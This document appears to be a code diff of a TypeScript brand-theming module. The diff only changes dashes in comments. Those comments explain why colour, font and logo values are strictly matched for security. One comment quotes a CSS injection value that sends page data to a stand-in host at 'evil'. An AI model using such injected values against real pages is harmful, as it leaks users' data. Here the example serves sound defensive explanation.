@@ -14,7 +14,7 @@ import { findFont, fontStack, type FontFace } from "./fonts";
  *     value is not text: `red;background:url(https://evil/?c=` in a custom
  *     property is a real request off the page, and a value ending in a
  *     closing brace can escape the rule entirely. So a colour is not
- *     sanitised, it is *matched* — six hex digits or it does not exist.
+ *     sanitised, it is *matched* - six hex digits or it does not exist.
  *
  *   - A logo lands in an `img src`. `javascript:` there is inert in modern
  *     browsers but `data:` is not, and an http:// URL on an https page is a
@@ -23,7 +23,7 @@ import { findFont, fontStack, type FontFace } from "./fonts";
  *
  * In both cases an invalid value degrades to absent. A brand that pastes a
  * malformed colour gets Qumo's default black button, not a broken page and
- * not an error — the page a shopper is standing in a queue to read must
+ * not an error - the page a shopper is standing in a queue to read must
  * render whatever the brand's settings say.
  */
 
@@ -41,7 +41,7 @@ export function safeColor(value: string | null | undefined): string | null {
  *
  * Same reasoning as the colour above and a shade stronger: the value lands
  * in a `font-family`, which is one of the few CSS properties that will
- * happily accept a bare word. Nothing a brand stored reaches the page —
+ * happily accept a bare word. Nothing a brand stored reaches the page -
  * what reaches it is a reference to a custom property named in
  * lib/brand/fonts.ts. An id that is not in the list resolves to null, and
  * null is Qumo's default.
@@ -70,7 +70,7 @@ export function safeLogoUrl(value: string | null | undefined): string | null {
 export type BrandTheme = {
   id: string;
   slug: string;
-  /** Always present — falls back through displayName to name. */
+  /** Always present - falls back through displayName to name. */
   name: string;
   tagline: string | null;
   logoUrl: string | null;
@@ -130,7 +130,7 @@ export function toBrandTheme(brand: BrandIdentityFields): BrandTheme {
  * Four tokens and no more: the primary button, its ink, the face everything
  * is read in and the face every figure is set in. The stylesheets were
  * already written against tokens rather than literal colours and families,
- * so a brand does not get to restyle the page — it gets to own the parts
+ * so a brand does not get to restyle the page - it gets to own the parts
  * that carry its identity. Contrast on everything else stays predictable,
  * and a brand with a terrible palette still cannot make its own programme
  * unreadable.
